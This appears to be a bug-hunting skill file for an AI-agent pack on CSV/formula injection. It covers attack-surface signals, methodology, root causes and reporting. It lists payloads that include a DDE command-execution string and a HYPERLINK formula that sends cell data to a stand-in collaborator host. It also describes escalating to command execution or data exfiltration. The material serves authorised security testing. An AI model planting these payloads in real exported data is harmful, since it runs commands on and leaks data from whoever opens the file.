---
skill: csv-injection
title: "CSV / Formula Injection"
category: "Security · Web"
load_when: "csv injection, formula injection, excel injection, spreadsheet injection, =cmd, DDE, export injection"
pack: SUPERAGENT V10
bughunt: true
---

# CSV / Formula Injection

## Where it pays
Input exported to CSV/XLSX can execute formulas when opened — command execution on the victim's machine (often support staff/admins who open reports).

## Attack-surface signals
Any field later downloadable as CSV/Excel: names, notes, feedback, logs, invoices, 'export to spreadsheet'.

## Methodology
1. Inject a formula-leading value into an exported field. 2. Export and open to confirm formula execution. 3. Escalate: DDE/cmd to run commands, or exfil cell data via a webhook/hyperlink. 4. Note: impact lands on whoever opens the file.

## Payloads / probes
```
=1+1
=cmd|'/c calc'!A1
@SUM(1+1)
=HYPERLINK("http://collab/?"&A1,"click")
+=1+1
```

## Root causes
Exported values not prefixed/escaped (no leading-`'` or neutralization of = + - @).

## Validation gate
Show a formula executing (or a DDE/hyperlink firing) when the exported file is opened.

## Impact & chains
Command execution / data exfil on the victim who opens the export. Chains with business-logic.

## 🧪 Try it locally
```bash
python3 ../../../tools/skill_router.py "csv injection, formula injection, excel injection, spreadsheet injection, =cmd, DDE, export injection"
```

→ Report with `../reporting/writeup.md` (CWE-1236); validate with `../reporting/validation-gate.md`.
